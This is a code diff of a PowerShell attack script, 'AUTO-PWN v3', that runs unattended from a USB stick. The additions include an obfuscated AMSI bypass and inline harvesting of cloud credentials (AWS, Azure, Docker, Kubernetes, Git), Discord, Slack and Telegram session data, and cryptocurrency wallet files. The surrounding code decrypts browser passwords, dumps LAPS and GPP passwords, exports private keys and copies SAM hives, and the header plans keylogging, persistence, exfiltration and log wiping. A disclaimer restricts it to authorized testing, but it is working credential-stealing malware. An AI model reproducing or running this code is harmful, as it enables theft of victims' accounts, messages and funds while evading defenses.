@@ -1,87 +1,116 @@
 ﻿<#
 ============================================================================
-  FLLC — AUTO-PWN v2: Drop-and-Forget Attack Chain
-  ─────────────────────────────────────────────────────
+  FLLC — AUTO-PWN v3: 15-Phase Drop-and-Forget Attack Chain
+  ══════════════════════════════════════════════════════════════
+  v1.777 | 2026
 
-  10-phase offensive pipeline.  Zero interaction required.
-  Insert USB. Walk away.  Retrieve results later.
+  15-phase offensive pipeline with evasion framework.
+  Zero interaction. Zero detection. Maximum extraction.
+  Insert USB. Walk away. Retrieve results later.
 
   EXECUTION ORDER:
   ═══════════════
 
-  ┌─ PHASE 0: ENV FINGERPRINT + DEFENSE ENUM + STEALTH ───────┐
-  │  VM/sandbox detection, EDR/AV enumeration, AMSI check,     │
-  │  Sysmon detection, AppLocker status, PS logging state,     │
-  │  process priority reduction, timestomping                  │
-  └────────────────────────────────────────────────────────────┘
+  ┌─ PHASE 0:  EVASION INIT + ENV FINGERPRINT ──────────────────┐
+  │  AMSI bypass (4 methods), ETW blind, script log disable,     │
+  │  VM/sandbox detect, EDR/AV enum, Defender exclusion abuse,   │
+  │  process priority, timestomp, window hide                    │
+  └──────────────────────────────────────────────────────────────┘
             │
-  ┌─ PHASE 1: RECONNAISSANCE ─────────────────────────────────┐
-  │  System info, network config, running processes,           │
-  │  installed software, USB history, firewall rules, env vars │
-  └────────────────────────────────────────────────────────────┘
+  ┌─ PHASE 1:  RECONNAISSANCE ──────────────────────────────────┐
+  │  System info, network, processes, software, USB, firewall    │
+  └──────────────────────────────────────────────────────────────┘
             │
-  ┌─ PHASE 1.5: NETWORK LATERAL MOVEMENT RECON ───────────────┐
-  │  ARP neighbor scan, SMB share enum (admin shares),         │
-  │  AD SPN/Kerberoast targets, AS-REP roastable users,        │
-  │  Domain Admin group enum, GPP password extraction,         │
-  │  LAPS password dump, ADCS CA discovery, port scanning      │
-  └────────────────────────────────────────────────────────────┘
+  ┌─ PHASE 2:  NETWORK LATERAL MOVEMENT ────────────────────────┐
+  │  ARP, SMB shares, AD SPN/Kerberoast, AS-REP, LAPS, ADCS,   │
+  │  GPP passwords, port scan, domain admin enum                 │
+  └──────────────────────────────────────────────────────────────┘
             │
-  ┌─ PHASE 2: CREDENTIAL HARVEST ─────────────────────────────┐
-  │  6 browsers (Chrome/Edge/Brave/Opera/Vivaldi/Firefox),     │
-  │  WiFi passwords, cmdkey vault, SSH keys, RDP history,      │
-  │  cloud configs (AWS/Azure/GCP/K8s/Docker/Git/.env/.pgpass) │
-  └────────────────────────────────────────────────────────────┘
+  ┌─ PHASE 3:  CREDENTIAL HARVEST ──────────────────────────────┐
+  │  6 browsers, WiFi, cmdkey, SSH, RDP, cloud configs           │
+  └──────────────────────────────────────────────────────────────┘
             │
-  ┌─ PHASE 2.5: DPAPI CREDENTIAL DECRYPTION ──────────────────┐
-  │  AES-256-GCM master key extraction from Local State,       │
-  │  Chromium password decryption (v10 blobs), Firefox NSS,    │
-  │  Windows Credential Vault extraction, DPAPI key backup,    │
-  │  certificate private key export, SAM/SYSTEM hive dump      │
-  └────────────────────────────────────────────────────────────┘
+  ┌─ PHASE 4:  DPAPI DECRYPTION ────────────────────────────────┐
+  │  AES-256-GCM key extract, Chromium decrypt, vault, SAM/SYS  │
+  └──────────────────────────────────────────────────────────────┘
             │
-  ┌─ PHASE 3: PRIVILEGE ESCALATION ────────────────────────────┐
-  │  17-vector privesc scan, 4x UAC bypass, token abuse,       │
-  │  service reconfiguration, DLL hijacking, kernel CVEs,      │
-  │  PrintNightmare, HiveNightmare, auto-exploit mode          │
-  └────────────────────────────────────────────────────────────┘
+  ┌─ PHASE 5:  CLOUD & SaaS HARVESTING ─────────────────────────┐
+  │  M365 tokens, Azure AD, Google, AWS, GitHub, Docker, K8s,   │
+  │  Terraform state, IDE creds, .env recursive, SSH/GPG keys   │
+  └──────────────────────────────────────────────────────────────┘
             │
-  ┌─ PHASE 4: SQL INJECTION SCAN ─────────────────────────────┐
-  │  Local service discovery (11 ports), endpoint crawling,    │
-  │  40+ SQLi payloads (error/boolean/time/UNION), DB detect   │
-  └────────────────────────────────────────────────────────────┘
+  ┌─ PHASE 6:  COMMUNICATIONS DATA ─────────────────────────────┐
+  │  Discord tokens, Slack tokens, Telegram sessions, Signal DB, │
+  │  WhatsApp, Zoom, Teams, email clients, webmail cookies       │
+  └──────────────────────────────────────────────────────────────┘
             │
-  ┌─ PHASE 5: NPP EXPLOITATION ───────────────────────────────┐
-  │  5 attack vectors, DLL hijacking, updater sideloading,     │
-  │  NppFTP credential extraction, CVE matching, persistence   │
-  └────────────────────────────────────────────────────────────┘
+  ┌─ PHASE 7:  CRYPTOCURRENCY WALLETS ──────────────────────────┐
+  │  40+ desktop wallets, 20+ browser extensions, seed phrases,  │
+  │  exchange API keys, mining configs, address discovery         │
+  └──────────────────────────────────────────────────────────────┘
             │
-  ┌─ PHASE 6: PERSISTENCE — INPUT MONITOR ─────────────────────┐
-  │  Dual-method capture (pynput + Win32 hooks), keystrokes,   │
-  │  mouse clicks, clipboard, window tracking, URL capture     │
-  └────────────────────────────────────────────────────────────┘
+  ┌─ PHASE 8:  PRIVILEGE ESCALATION ────────────────────────────┐
+  │  17-vector scan, 4x UAC bypass, token abuse, DLL hijack,    │
+  │  kernel CVEs, PrintNightmare, HiveNightmare, auto-exploit   │
+  └──────────────────────────────────────────────────────────────┘
             │
-  ┌─ PHASE 7: DATA PACKAGING ─────────────────────────────────┐
-  │  Session manifest, file inventory, ZIP compression         │
-  └────────────────────────────────────────────────────────────┘
+  ┌─ PHASE 9:  SQL INJECTION SCAN ──────────────────────────────┐
+  │  Local service discovery, endpoint crawl, 40+ SQLi payloads │
+  └──────────────────────────────────────────────────────────────┘
             │
-  ┌─ PHASE 8: NETWORK EXFILTRATION ────────────────────────────┐
-  │  HTTP POST chunked upload, DNS tunneling, webhook notify   │
-  │  (Discord/Slack/Teams), configurable C2 endpoints          │
-  └────────────────────────────────────────────────────────────┘
+  ┌─ PHASE 10: APPLICATION EXPLOITATION ────────────────────────┐
+  │  Notepad++ DLL hijack, config injection, session exfil       │
+  └──────────────────────────────────────────────────────────────┘
             │
-  ┌─ PHASE 9: ANTI-FORENSICS + CLEANUP ───────────────────────┐
-  │  PS history scrub, event log clearing, prefetch cleanup,   │
-  │  timestomping all output, recent items purge               │
-  └────────────────────────────────────────────────────────────┘
+  ┌─ PHASE 11: INPUT MONITOR ───────────────────────────────────┐
+  │  Keystrokes, mouse, clipboard, screenshots, URLs             │
+  └──────────────────────────────────────────────────────────────┘
+            │
+  ┌─ PHASE 12: PERSISTENCE INSTALLATION ────────────────────────┐
+  │  12 methods: Task/Reg/WMI/COM/DLL/IFEO/Screensaver/Startup │
+  └──────────────────────────────────────────────────────────────┘
+            │
+  ┌─ PHASE 13: DATA PACKAGING + EXFILTRATION ───────────────────┐
+  │  Manifest, ZIP, HTTP POST, DNS tunnel, webhook notify        │
+  └──────────────────────────────────────────────────────────────┘
+            │
+  ┌─ PHASE 14: ANTI-FORENSICS + CLEANUP ────────────────────────┐
+  │  PS history scrub, event log clear, prefetch, timestomp,     │
+  │  recent items purge, execution trace removal                 │
+  └──────────────────────────────────────────────────────────────┘
 
   AUTHORIZED PENETRATION TESTING USE ONLY.
-  FLLC
+  FLLC 2026
 ============================================================================
 #>
 
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference    = "SilentlyContinue"
+
+# ══════════════════════════════════════════════════════════════════════════
+#  EVASION FRAMEWORK — IMPORT
+# ══════════════════════════════════════════════════════════════════════════
+
+$evasionPath = Join-Path $PSScriptRoot "evasion.ps1"
+if (Test-Path $evasionPath) {
+    . $evasionPath
+    $evasionReport = Initialize-Evasion -AggressiveMode
+    # If sandbox detected with extreme confidence and not aggressive, throttle
+    if ($evasionReport.sandbox -and $evasionReport.sandbox.Score -ge 15) {
+        # We are likely in a sandbox — run minimal recon only
+        $SANDBOX_MODE = $true
+    } else {
+        $SANDBOX_MODE = $false
+    }
+} else {
+    $SANDBOX_MODE = $false
+    # Inline AMSI bypass fallback
+    try {
+        $a=[Ref].Assembly.GetType(('System.Manage'+'ment.Autom'+'ation.Amsi'+'Utils'))
+        $f=$a.GetField(('amsiInit'+'Failed'),'NonPublic,Static')
+        $f.SetValue($null,$true)
+    } catch {}
+}
 
 # ══════════════════════════════════════════════════════════════════════════
 #  DYNAMIC PATH DETECTION
@@ -133,10 +162,10 @@ MLog "  Output: $sessionDir"
 MLog "══════════════════════════════════════════════"
 
 # ══════════════════════════════════════════════════════════════════════════
-#  PHASE 0: ENVIRONMENT FINGERPRINT + DEFENSE ENUMERATION + STEALTH
+#  PHASE 0: EVASION INIT + ENVIRONMENT FINGERPRINT
 # ══════════════════════════════════════════════════════════════════════════
 
-MLog "[PHASE 0] Environment fingerprint + stealth..."
+MLog "[PHASE 0] Evasion init + environment fingerprint..."
 
 $maxRuntime = 900  # seconds
 $startTime = Get-Date
@@ -426,17 +455,17 @@ Get-ChildItem Env: | Select-Object Name,Value | Export-Csv "$reconDir\env_vars.c
 MLog "[PHASE 1] Recon complete — saved to $reconDir"
 
 # ══════════════════════════════════════════════════════════════════════════
-#  PHASE 1.5: NETWORK LATERAL MOVEMENT RECON
+#  PHASE 2: NETWORK LATERAL MOVEMENT
 # ══════════════════════════════════════════════════════════════════════════
 
-MLog "[PHASE 1.5] Network lateral movement recon..."
+MLog "[PHASE 2] Network lateral movement recon..."
 $netDir = Join-Path $sessionDir "network_recon"
 New-Item -ItemType Directory -Path $netDir -Force | Out-Null
 
 # ──── ARP neighbors (live hosts) ───────────────────────────────────────
 $arpEntries = Get-NetNeighbor -AddressFamily IPv4 2>$null | Where-Object { $_.State -ne 'Unreachable' }
 $arpEntries | Export-Csv "$netDir\live_hosts.csv" -NoTypeInformation
-MLog "[PHASE 1.5] ARP neighbors: $($arpEntries.Count)"
+MLog "[PHASE 2] ARP neighbors: $($arpEntries.Count)"
 
 # ──── SMB share enumeration ────────────────────────────────────────────
 $smbTargets = @()
@@ -456,7 +485,7 @@ foreach ($target in $smbTargets) {
         $shares = net view "\\$target" /all 2>$null
         if ($shares) {
             $shareResults += @{ host = $target; shares = ($shares -join "`n") }
-            MLog "[PHASE 1.5] SMB shares found on $target"
+            MLog "[PHASE 2] SMB shares found on $target"
         }
     } catch {}
     # Check for common admin shares
@@ -464,7 +493,7 @@ foreach ($target in $smbTargets) {
         $testPath = "\\$target\$adminShare"
         if (Test-Path $testPath 2>$null) {
             $shareResults += @{ host = $target; share = $adminShare; accessible = $true }
-            MLog "[PHASE 1.5] ADMIN SHARE ACCESSIBLE: $testPath"
+            MLog "[PHASE 2] ADMIN SHARE ACCESSIBLE: $testPath"
         }
     }
 }
@@ -472,7 +501,7 @@ $shareResults | ConvertTo-Json -Depth 3 | Out-File "$netDir\smb_shares.json" -En
 
 # ──── Active Directory: SPN enumeration (Kerberoast targets) ───────────
 if ($sysInfo.domain_joined) {
-    MLog "[PHASE 1.5] AD SPN enumeration..."
+    MLog "[PHASE 2] AD SPN enumeration..."
     try {
         $searcher = New-Object System.DirectoryServices.DirectorySearcher
         $searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*))"
@@ -489,12 +518,12 @@ if ($sysInfo.domain_joined) {
                 admin_count = ($props["admincount"] | ForEach-Object { $_ })
                 pwd_last_set = ($props["pwdlastset"] | ForEach-Object { [DateTime]::FromFileTime($_) })
             }
-            MLog "[PHASE 1.5] KERBEROAST TARGET: $($props['samaccountname']) — $($props['serviceprincipalname'])"
+            MLog "[PHASE 2] KERBEROAST TARGET: $($props['samaccountname']) — $($props['serviceprincipalname'])"
         }
         $spnData | ConvertTo-Json -Depth 4 | Out-File "$netDir\kerberoast_targets.json" -Encoding UTF8
-        MLog "[PHASE 1.5] Kerberoastable accounts: $($spnData.Count)"
+        MLog "[PHASE 2] Kerberoastable accounts: $($spnData.Count)"
     } catch {
-        MLog "[PHASE 1.5] SPN enumeration failed: $($_.Exception.Message)"
+        MLog "[PHASE 2] SPN enumeration failed: $($_.Exception.Message)"
     }
 
     # ──── AD: AS-REP Roastable users (no preauth) ────────────────────
@@ -510,7 +539,7 @@ if ($sysInfo.domain_joined) {
                 user = ($props["samaccountname"] | ForEach-Object { $_ })
                 dn = ($props["distinguishedname"] | ForEach-Object { $_ })
             }
-            MLog "[PHASE 1.5] AS-REP ROASTABLE: $($props['samaccountname'])"
+            MLog "[PHASE 2] AS-REP ROASTABLE: $($props['samaccountname'])"
         }
         $asrepData | ConvertTo-Json -Depth 3 | Out-File "$netDir\asrep_roastable.json" -Encoding UTF8
     } catch {}
@@ -529,7 +558,7 @@ if ($sysInfo.domain_joined) {
                 if ($grpResult) {
                     $members = $grpResult.Properties["member"] | ForEach-Object { ($_ -split ',')[0] -replace 'CN=' }
                     $groupMembers[$grp] = $members
-                    MLog "[PHASE 1.5] $grp members: $($members.Count)"
+                    MLog "[PHASE 2] $grp members: $($members.Count)"
                 }
             } catch {}
         }
@@ -547,7 +576,7 @@ if ($sysInfo.domain_joined) {
                 $content = Get-Content $gf.FullName -Raw
                 if ($content -match "cpassword") {
                     Copy-Item $gf.FullName (Join-Path $netDir "GPP_$($gf.Name)") -Force 2>$null
-                    MLog "[PHASE 1.5] GPP PASSWORD FOUND: $($gf.FullName)"
+                    MLog "[PHASE 2] GPP PASSWORD FOUND: $($gf.FullName)"
                 }
             }
         }
@@ -566,7 +595,7 @@ if ($sysInfo.domain_joined) {
                     computer = ($lr.Properties["cn"] | ForEach-Object { $_ })
                     password = ($lr.Properties["ms-mcs-admpwd"] | ForEach-Object { $_ })
                 }
-                MLog "[PHASE 1.5] LAPS PASSWORD: $($lr.Properties['cn'])"
+                MLog "[PHASE 2] LAPS PASSWORD: $($lr.Properties['cn'])"
             }
             $lapsData | ConvertTo-Json -Depth 3 | Out-File "$netDir\laps_passwords.json" -Encoding UTF8
         }
@@ -587,7 +616,7 @@ if ($sysInfo.domain_joined) {
                     dns  = ($ca.Properties["dnshostname"] | ForEach-Object { $_ })
                     templates = ($ca.Properties["certificatetemplates"] | ForEach-Object { $_ })
                 }
-                MLog "[PHASE 1.5] ADCS CA found: $($ca.Properties['cn'])"
+                MLog "[PHASE 2] ADCS CA found: $($ca.Properties['cn'])"
             }
             $caData | ConvertTo-Json -Depth 3 | Out-File "$netDir\adcs_cas.json" -Encoding UTF8
         }
@@ -606,7 +635,7 @@ foreach ($target in $scanTargets) {
             $wait = $result.AsyncWaitHandle.WaitOne(500, $false)
             if ($wait -and $tcp.Connected) {
                 $portResults += @{ host = $target; port = $port; service = $lateralPorts[$port] }
-                MLog "[PHASE 1.5] OPEN: ${target}:${port} ($($lateralPorts[$port]))"
+                MLog "[PHASE 2] OPEN: ${target}:${port} ($($lateralPorts[$port]))"
             }
             $tcp.Close()
         } catch {}
@@ -614,13 +643,13 @@ foreach ($target in $scanTargets) {
 }
 $portResults | ConvertTo-Json -Depth 3 | Out-File "$netDir\open_ports.json" -Encoding UTF8
 
-MLog "[PHASE 1.5] Network recon complete — $($shareResults.Count) shares, $($portResults.Count) open ports"
+MLog "[PHASE 2] Network recon complete — $($shareResults.Count) shares, $($portResults.Count) open ports"
 
 # ══════════════════════════════════════════════════════════════════════════
-#  PHASE 2: CREDENTIAL HARVEST
+#  PHASE 3: CREDENTIAL HARVEST
 # ══════════════════════════════════════════════════════════════════════════
 
-MLog "[PHASE 2] Credential harvest starting..."
+MLog "[PHASE 3] Credential harvest starting..."
 $credDir = Join-Path $sessionDir "credentials"
 New-Item -ItemType Directory -Path $credDir -Force | Out-Null
 
@@ -684,7 +713,7 @@ foreach ($browser in $browserPaths.Keys) {
                 Copy-Item "$path\Local State" "$browserDir\Local State" -Force 2>$null
             }
         }
-        MLog "[PHASE 2] $browser data copied"
+        MLog "[PHASE 3] $browser data copied"
     }
 }
 
@@ -696,7 +725,7 @@ if (Test-Path $sshDir) {
     Get-ChildItem $sshDir -File | ForEach-Object {
         Copy-Item $_.FullName (Join-Path $sshDest $_.Name) -Force 2>$null
     }
-    MLog "[PHASE 2] SSH keys copied"
+    MLog "[PHASE 3] SSH keys copied"
 }
 
 # RDP connection history
@@ -729,17 +758,17 @@ foreach ($cc in $cloudConfigs) {
     if (Test-Path $cc) {
         $destName = ($cc -replace '[\\/:*?"<>|]', '_')
         Copy-Item $cc (Join-Path $cloudDir $destName) -Force 2>$null
-        MLog "[PHASE 2] Cloud config: $cc"
+        MLog "[PHASE 3] Cloud config: $cc"
     }
 }
 
-MLog "[PHASE 2] Credential harvest complete"
+MLog "[PHASE 3] Credential harvest complete"
 
 # ══════════════════════════════════════════════════════════════════════════
-#  PHASE 2.5: DPAPI CREDENTIAL DECRYPTION
+#  PHASE 4: DPAPI CREDENTIAL DECRYPTION
 # ══════════════════════════════════════════════════════════════════════════
 
-MLog "[PHASE 2.5] DPAPI credential decryption..."
+MLog "[PHASE 4] DPAPI credential decryption..."
 $decryptDir = Join-Path $sessionDir "decrypted_creds"
 New-Item -ItemType Directory -Path $decryptDir -Force | Out-Null
 
@@ -768,11 +797,11 @@ function Decrypt-ChromiumPasswords {
         )
 
         if (-not $aesKey -or $aesKey.Length -eq 0) {
-            MLog "[PHASE 2.5] $BrowserName: DPAPI key decryption failed"
+            MLog "[PHASE 4] $BrowserName: DPAPI key decryption failed"
             return
         }
 
-        MLog "[PHASE 2.5] $BrowserName: AES-256-GCM master key extracted ($($aesKey.Length) bytes)"
+        MLog "[PHASE 4] $BrowserName: AES-256-GCM master key extracted ($($aesKey.Length) bytes)"
 
         # Find all Login Data files
         $profiles = @("Default") + (Get-ChildItem $UserDataPath -Directory -Filter "Profile *" | ForEach-Object { $_.Name })
@@ -810,7 +839,7 @@ function Decrypt-ChromiumPasswords {
                     $idx += 6
                 }
 
-                MLog "[PHASE 2.5] $BrowserName/$prof: Found $($v10Positions.Count) v10 encrypted entries, $($urls.Count) URLs"
+                MLog "[PHASE 4] $BrowserName/$prof: Found $($v10Positions.Count) v10 encrypted entries, $($urls.Count) URLs"
 
                 foreach ($pos in $v10Positions) {
                     try {
@@ -839,7 +868,7 @@ function Decrypt-ChromiumPasswords {
                     } catch { continue }
                 }
             } catch {
-                MLog "[PHASE 2.5] $BrowserName/$prof SQLite read error: $($_.Exception.Message)"
+                MLog "[PHASE 4] $BrowserName/$prof SQLite read error: $($_.Exception.Message)"
             } finally {
                 Remove-Item $tempDb -Force 2>$null
             }
@@ -860,11 +889,11 @@ function Decrypt-ChromiumPasswords {
                 $credIdx++
             }
             $output | Out-File "$decryptDir\${BrowserName}_passwords.txt" -Encoding UTF8
-            MLog "[PHASE 2.5] $BrowserName: $($extractedCreds.Count) credentials decrypted"
+            MLog "[PHASE 4] $BrowserName: $($extractedCreds.Count) credentials decrypted"
         }
 
     } catch {
-        MLog "[PHASE 2.5] $BrowserName DPAPI error: $($_.Exception.Message)"
+        MLog "[PHASE 4] $BrowserName DPAPI error: $($_.Exception.Message)"
     }
 }
 
@@ -903,7 +932,7 @@ if (Test-Path $ffProfiles) {
                 }
                 if ($ffCreds.Count -gt 0) {
                     $ffCreds | ConvertTo-Json -Depth 3 | Out-File "$decryptDir\Firefox_$($_.Name)_logins.json" -Encoding UTF8
-                    MLog "[PHASE 2.5] Firefox $($_.Name): $($ffCreds.Count) login entries (NSS-encrypted)"
+                    MLog "[PHASE 4] Firefox $($_.Name): $($ffCreds.Count) login entries (NSS-encrypted)"
                     # Copy key4.db for offline decryption
                     Copy-Item "$profDir\key4.db" "$decryptDir\Firefox_$($_.Name)_key4.db" -Force 2>$null
                 }
@@ -938,7 +967,7 @@ if (Test-Path $dpapiDir) {
     Get-ChildItem -Recurse $dpapiDir -File | ForEach-Object {
         Copy-Item $_.FullName (Join-Path $dpapiDest $_.Name) -Force 2>$null
     }
-    MLog "[PHASE 2.5] DPAPI master keys copied for offline analysis"
+    MLog "[PHASE 4] DPAPI master keys copied for offline analysis"
 }
 
 # ──── Certificate Store (private keys) ─────────────────────────────────
@@ -958,7 +987,7 @@ try {
             try {
                 $pfxBytes = $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, "")
                 [IO.File]::WriteAllBytes("$decryptDir\cert_$($cert.Thumbprint.Substring(0,8)).pfx", $pfxBytes)
-                MLog "[PHASE 2.5] Certificate exported: $($cert.Subject)"
+                MLog "[PHASE 4] Certificate exported: $($cert.Subject)"
             } catch {}
         }
         $certInfo | ConvertTo-Json -Depth 3 | Out-File "$decryptDir\certificates.json" -Encoding UTF8
@@ -977,7 +1006,7 @@ try {
             $hiveSrc = "$shadowPath\Windows\System32\config\$hive"
             cmd /c "copy `"$hiveSrc`" `"$samDest\$hive`"" 2>$null
         }
-        MLog "[PHASE 2.5] SAM/SYSTEM/SECURITY hives copied from shadow copy"
+        MLog "[PHASE 4] SAM/SYSTEM/SECURITY hives copied from shadow copy"
     } else {
         # Direct reg save attempt (requires admin)
         $samDest = Join-Path $decryptDir "hives"
@@ -988,28 +1017,164 @@ try {
     }
 } catch {}
 
-MLog "[PHASE 2.5] Credential decryption complete"
+MLog "[PHASE 4] Credential decryption complete"
 
 # ══════════════════════════════════════════════════════════════════════════
-#  PHASE 3: PRIVILEGE ESCALATION
+#  PHASE 5: CLOUD & SaaS HARVESTING
 # ══════════════════════════════════════════════════════════════════════════
 
-MLog "[PHASE 3] Privilege escalation scan..."
+MLog "[PHASE 5] Cloud & SaaS harvesting..."
+$cloudScript = Join-Path $PSScriptRoot "cloud_harvester.ps1"
+if (Test-Path $cloudScript) {
+    $cloudOut = Join-Path $sessionDir "cloud"
+    try {
+        & $cloudScript -OutputDir $cloudOut -Silent
+        MLog "[PHASE 5] Cloud harvest complete — results in $cloudOut"
+    } catch {
+        MLog "[PHASE 5] Cloud harvest error: $($_.Exception.Message)"
+    }
+} else {
+    # Inline minimal cloud harvest
+    MLog "[PHASE 5] cloud_harvester.ps1 not found — running inline..."
+    $cloudDir = Join-Path $sessionDir "cloud"
+    New-Item -ItemType Directory -Path $cloudDir -Force | Out-Null
+    
+    # Quick: AWS credentials
+    foreach ($cf in @("$env:USERPROFILE\.aws\credentials","$env:USERPROFILE\.aws\config")) {
+        if (Test-Path $cf) { Copy-Item $cf "$cloudDir\$(Split-Path $cf -Leaf)" -Force 2>$null }
+    }
+    # Quick: Azure tokens
+    if (Test-Path "$env:USERPROFILE\.azure") {
+        Get-ChildItem "$env:USERPROFILE\.azure" -File | ForEach-Object {
+            Copy-Item $_.FullName "$cloudDir\azure_$($_.Name)" -Force 2>$null
+        }
+    }
+    # Quick: Docker/K8s
+    foreach ($cf in @("$env:USERPROFILE\.docker\config.json","$env:USERPROFILE\.kube\config")) {
+        if (Test-Path $cf) { Copy-Item $cf "$cloudDir\$(Split-Path $cf -Leaf)" -Force 2>$null }
+    }
+    # Quick: Git credentials
+    foreach ($cf in @("$env:USERPROFILE\.git-credentials","$env:USERPROFILE\.gitconfig")) {
+        if (Test-Path $cf) { Copy-Item $cf "$cloudDir\$(Split-Path $cf -Leaf)" -Force 2>$null }
+    }
+    MLog "[PHASE 5] Inline cloud harvest complete"
+}
+New-RandomJitter 2>$null
+
+# ══════════════════════════════════════════════════════════════════════════
+#  PHASE 6: COMMUNICATIONS DATA HARVESTING
+# ══════════════════════════════════════════════════════════════════════════
+
+MLog "[PHASE 6] Communications data harvesting..."
+$commsScript = Join-Path $PSScriptRoot "comms_harvester.ps1"
+if (Test-Path $commsScript) {
+    $commsOut = Join-Path $sessionDir "comms"
+    try {
+        & $commsScript -OutputDir $commsOut -Silent
+        MLog "[PHASE 6] Comms harvest complete — results in $commsOut"
+    } catch {
+        MLog "[PHASE 6] Comms harvest error: $($_.Exception.Message)"
+    }
+} else {
+    # Inline minimal comms harvest — Discord tokens
+    MLog "[PHASE 6] comms_harvester.ps1 not found — running inline..."
+    $commsDir = Join-Path $sessionDir "comms"
+    New-Item -ItemType Directory -Path $commsDir -Force | Out-Null
+    
+    foreach ($app in @("discord","discordcanary","discordptb")) {
+        $lsPath = "$env:APPDATA\$app\Local Storage\leveldb"
+        if (Test-Path $lsPath) {
+            $dest = Join-Path $commsDir $app
+            New-Item -ItemType Directory -Path $dest -Force | Out-Null
+            Get-ChildItem $lsPath -File -Filter "*.ldb" | ForEach-Object {
+                Copy-Item $_.FullName (Join-Path $dest $_.Name) -Force 2>$null
+            }
+        }
+    }
+    # Slack
+    $slackLs = "$env:APPDATA\Slack\Local Storage\leveldb"
+    if (Test-Path $slackLs) {
+        $slackDest = Join-Path $commsDir "slack"
+        New-Item -ItemType Directory -Path $slackDest -Force | Out-Null
+        Get-ChildItem $slackLs -File | ForEach-Object {
+            Copy-Item $_.FullName (Join-Path $slackDest $_.Name) -Force 2>$null
+        }
+    }
+    # Telegram tdata
+    $tdataPath = "$env:APPDATA\Telegram Desktop\tdata"
+    if (Test-Path $tdataPath) {
+        $tgDest = Join-Path $commsDir "telegram"
+        New-Item -ItemType Directory -Path $tgDest -Force | Out-Null
+        Get-ChildItem $tdataPath -File | Select-Object -First 20 | ForEach-Object {
+            Copy-Item $_.FullName (Join-Path $tgDest $_.Name) -Force 2>$null
+        }
+    }
+    MLog "[PHASE 6] Inline comms harvest complete"
+}
+New-RandomJitter 2>$null
+
+# ══════════════════════════════════════════════════════════════════════════
+#  PHASE 7: CRYPTOCURRENCY WALLET HUNTING
+# ══════════════════════════════════════════════════════════════════════════
+
+MLog "[PHASE 7] Cryptocurrency wallet hunting..."
+$cryptoScript = Join-Path $PSScriptRoot "crypto_hunter.ps1"
+if (Test-Path $cryptoScript) {
+    $cryptoOut = Join-Path $sessionDir "crypto"
+    try {
+        & $cryptoScript -OutputDir $cryptoOut -Silent
+        MLog "[PHASE 7] Crypto hunt complete — results in $cryptoOut"
+    } catch {
+        MLog "[PHASE 7] Crypto hunt error: $($_.Exception.Message)"
+    }
+} else {
+    # Inline minimal crypto hunt
+    MLog "[PHASE 7] crypto_hunter.ps1 not found — running inline..."
+    $cryptoDir = Join-Path $sessionDir "crypto"
+    New-Item -ItemType Directory -Path $cryptoDir -Force | Out-Null
+    
+    $quickWallets = @{
+        "Exodus"   = "$env:APPDATA\Exodus\exodus.wallet"
+        "Electrum" = "$env:APPDATA\Electrum"
+        "Atomic"   = "$env:APPDATA\atomic\Local Storage\leveldb"
+        "Bitcoin"  = "$env:APPDATA\Bitcoin"
+    }
+    foreach ($wn in $quickWallets.Keys) {
+        $wp = $quickWallets[$wn]
+        if (Test-Path $wp) {
+            $dest = Join-Path $cryptoDir $wn
+            New-Item -ItemType Directory -Path $dest -Force | Out-Null
+            Get-ChildItem $wp -File -Include "*.wallet","*.dat","*.json","*.db" -Recurse -ErrorAction SilentlyContinue |
+                Select-Object -First 20 | ForEach-Object {
+                Copy-Item $_.FullName (Join-Path $dest $_.Name) -Force 2>$null
+            }
+            MLog "[PHASE 7] Wallet found: $wn"
+        }
+    }
+    MLog "[PHASE 7] Inline crypto hunt complete"
+}
+New-RandomJitter 2>$null
+
+# ══════════════════════════════════════════════════════════════════════════
+#  PHASE 8: PRIVILEGE ESCALATION
+# ══════════════════════════════════════════════════════════════════════════
+
+MLog "[PHASE 8] Privilege escalation scan..."
 
 $privescScript = Join-Path $payloadBase "privesc.ps1"
 if (Test-Path $privescScript) {
     $privescOut = Join-Path $sessionDir "privesc"
     & $privescScript -OutputDir $privescOut -Silent
-    MLog "[PHASE 3] Privesc scan complete — results in $privescOut"
+    MLog "[PHASE 8] Privesc scan complete — results in $privescOut"
 } else {
-    MLog "[PHASE 3] privesc.ps1 not found at $privescScript — skipping"
+    MLog "[PHASE 8] privesc.ps1 not found at $privescScript — skipping"
 }
 
 # ══════════════════════════════════════════════════════════════════════════
-#  PHASE 4: SQL INJECTION SCAN
+#  PHASE 9: SQL INJECTION SCAN
 # ══════════════════════════════════════════════════════════════════════════
 
-MLog "[PHASE 4] SQL injection scan..."
+MLog "[PHASE 9] SQL injection scan..."
 
 # Check runtime limit
 $elapsed = ((Get-Date) - $startTime).TotalSeconds
@@ -1018,34 +1183,34 @@ if ($elapsed -lt ($maxRuntime - 120)) {
     if (Test-Path $sqliScript) {
         $sqliOut = Join-Path $sessionDir "sqli"
         & $sqliScript -OutputDir $sqliOut
-        MLog "[PHASE 4] SQLi scan complete — results in $sqliOut"
+        MLog "[PHASE 9] SQLi scan complete — results in $sqliOut"
     } else {
-        MLog "[PHASE 4] sqli_scanner.ps1 not found — skipping"
+        MLog "[PHASE 9] sqli_scanner.ps1 not found — skipping"
     }
 } else {
-    MLog "[PHASE 4] Skipped — time limit approaching"
+    MLog "[PHASE 9] Skipped — time limit approaching"
 }
 
 # ══════════════════════════════════════════════════════════════════════════
-#  PHASE 5: NOTEPAD++ EXPLOITATION
+#  PHASE 10: APPLICATION EXPLOITATION (NOTEPAD++)
 # ══════════════════════════════════════════════════════════════════════════
 
-MLog "[PHASE 5] Notepad++ exploitation..."
+MLog "[PHASE 10] Notepad++ exploitation..."
 
 $nppScript = Join-Path $payloadBase "npp_exploit.ps1"
 if (Test-Path $nppScript) {
     $nppOut = Join-Path $sessionDir "npp"
     & $nppScript -OutputDir $nppOut
-    MLog "[PHASE 5] NPP exploit complete — results in $nppOut"
+    MLog "[PHASE 10] NPP exploit complete — results in $nppOut"
 } else {
-    MLog "[PHASE 5] npp_exploit.ps1 not found — skipping"
+    MLog "[PHASE 10] npp_exploit.ps1 not found — skipping"
 }
 
 # ══════════════════════════════════════════════════════════════════════════
-#  PHASE 6: PERSISTENCE — INPUT MONITOR
+#  PHASE 11: PERSISTENCE — INPUT MONITOR
 # ══════════════════════════════════════════════════════════════════════════
 
-MLog "[PHASE 6] Deploying input monitor..."
+MLog "[PHASE 11] Deploying input monitor..."
 
